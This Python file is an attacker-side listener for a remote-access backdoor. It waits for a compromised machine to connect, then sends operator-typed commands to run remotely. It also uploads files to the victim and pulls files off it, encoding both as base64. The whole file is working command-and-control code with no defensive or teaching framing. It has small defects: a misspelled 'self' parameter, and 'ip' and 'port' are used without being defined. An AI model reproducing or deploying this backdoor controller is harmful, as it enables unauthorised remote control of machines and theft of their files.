import sys
import json
import base64
import socket

class Connections_Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for a connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection" + str(address))
    
    def send_data(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))
    
    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue
    
    def remote_code_execution(self, command):
        self.send_data(command)
        if command[0].lower() == 'exit':
            self.connection.close()
            sys.exit()
        return self.receive_data()
    
    def download_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return f"[+] \"{path}\" file download successful"
    
    def upload_files(eslf, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def start(self):
        while True:
            try:
                input_command = input(">>> ").split(" ")
                if input_command[0].lower() == 'upload':
                    content = self.upload_files(input_command[1]).decode()
                    input_command.append(content)
                result = self.remote_code_execution(input_command)
                if input_command[0].lower() == 'download':
                    result = self.download_file(input_command[1], result.encode('utf-8'))
            except Exception as error:
                print(error)
                print(type(error))
                # print("\n----- [=] Connection is still intact [=] -----")

listen = Connections_Listener(ip, port)
listen.start()